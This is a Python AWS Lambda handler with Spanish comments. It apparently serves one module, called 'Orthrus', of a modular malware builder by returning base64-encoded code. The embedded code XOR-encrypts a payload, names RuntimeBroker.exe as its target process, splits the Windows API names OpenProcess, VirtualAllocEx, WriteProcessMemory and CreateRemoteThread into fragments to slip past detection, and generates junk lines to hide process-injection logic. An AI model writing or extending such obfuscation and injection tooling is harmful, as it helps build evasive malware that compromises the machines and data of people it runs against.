import json
import base64


def lambda_handler(event, context):
    
    """ 
    El fragmento Orthrus sirve para generar codigo que ofusque la logica de la inyeccion (fragmento 3). 
    Se encarga de la ofuscación con código basura, reordenamiento y cifrado.      

    """
    # Código de ofuscación 
    texto = r"""

import random
import base64


num_aleatorio = random.randint(1, 255)
nombre_func_dec = f"init_core_{random.randint(100, 999)}"
nombre_func_pid = f"check_env_{random.randint(100, 999)}"
target_proc = "RuntimeBroker.exe"


texto_c = base64.b64encode(bytes([b ^ num_aleatorio for b in texto])).decode()


n_op = "Ope" + "nPr" + "ocess"
n_va = "Virtu" + "alAl" + "locE" + "x"
n_wm = "Writ" + "eProce" + "ssMem" + "ory"
n_ct = "Cre" + "ateRem" + "oteTh" + "read"


def junk():
    names = ["cache_id", "buffer_val", "temp_ref", "p_status", "v_offset"]
    lineas_ruido = []
   
    for _ in range(random.randint(2, 5)):
        name = random.choice(names) + "_" + str(random.randint(100, 999))
       
        tipo = random.randint(1, 2)
        if tipo == 1:
            linea = f"{name} = ({random.randint(100, 900)} * {random.randint(2, 4)})"
        else:
            linea = f"{name} = str(hex({random.randint(1000, 9000)})).replace('0x', '')"
       
        lineas_ruido.append(linea)
       
    return "\n    ".join(lineas_ruido)


"""
    # El código debe ser codificado en base64
    encoded = base64.b64encode(texto.encode()).decode()
   
   # Se devuelve el código ofuscado, el estado 200, el numero de modulo 2 y es binario = no (0)
    return {
        'statusCode': 200,
        'body': json.dumps({
            "module_id": 2,
            "content": encoded,
            "is_bin": 0
        })
    }
